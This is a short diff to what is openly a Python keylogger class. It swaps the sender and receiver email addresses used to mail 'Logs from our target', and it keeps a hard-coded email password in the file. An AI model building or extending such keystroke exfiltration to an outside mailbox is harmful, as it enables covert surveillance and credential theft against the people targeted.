@@ -11,9 +11,9 @@ logging.basicConfig(filename='logs.txt',level=logging.DEBUG)
 class KeyLogger:
 
     def __init__(self) -> None:
-        self.email_sender = "pedzio2004@gmail.com"
+        self.email_sender = "mal1234@gmail.com"
         self.email_password = "wvsdrezhajnrynim"
-        self.email_receiver = "szef1332@wp.pl"
+        self.email_receiver = "mail1334@wp.pl"
         self.subject = 'Logs from our target'
         
 
